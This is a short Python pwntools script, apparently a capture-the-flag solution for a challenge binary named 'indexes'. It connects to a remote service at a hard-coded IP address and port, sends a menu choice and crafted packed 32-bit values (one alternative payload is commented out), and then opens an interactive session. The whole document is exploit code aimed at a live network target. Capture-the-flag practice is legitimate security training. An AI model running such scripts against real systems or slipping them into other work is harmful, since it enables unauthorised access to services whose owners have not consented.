from pwn import *

proc = remote("109.233.56.90", 11572)#process("./indexes")
input()
proc.send(b"1")
#proc.send(p32(0xbca9c805) + p32(0xae6be105) + p32(0x31407201) + p32(0xe4b89086) + p32(0x3d9501a2) + p32(0x1461dc1a) +p32(0x29dd5330) + p32(0xbe6f63da))
proc.send(p32(0x0)*8)
proc.send(b"0")
proc.interactive()
